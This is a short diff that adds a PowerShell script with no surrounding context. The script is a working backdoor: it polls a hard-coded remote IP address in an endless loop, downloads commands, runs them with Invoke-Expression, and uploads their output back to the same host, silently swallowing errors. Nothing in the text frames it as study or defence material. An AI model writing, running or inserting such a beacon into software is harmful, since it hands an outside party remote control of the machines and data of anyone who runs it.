@@ -1,0 +1,11 @@
+$w = New-Object Net.WebClient
+while($true) {
+    try {
+        $c = $w.DownloadString('http://107.174.43.71:18090/cmd').Trim()
+        if($c -and $c.Length -gt 0) {
+            $o = Invoke-Expression $c 2>&1 | Out-String
+            $w.UploadString('http://107.174.43.71:18090/out', $o)
+        }
+    } catch { }
+    Start-Sleep -Seconds 5
+}
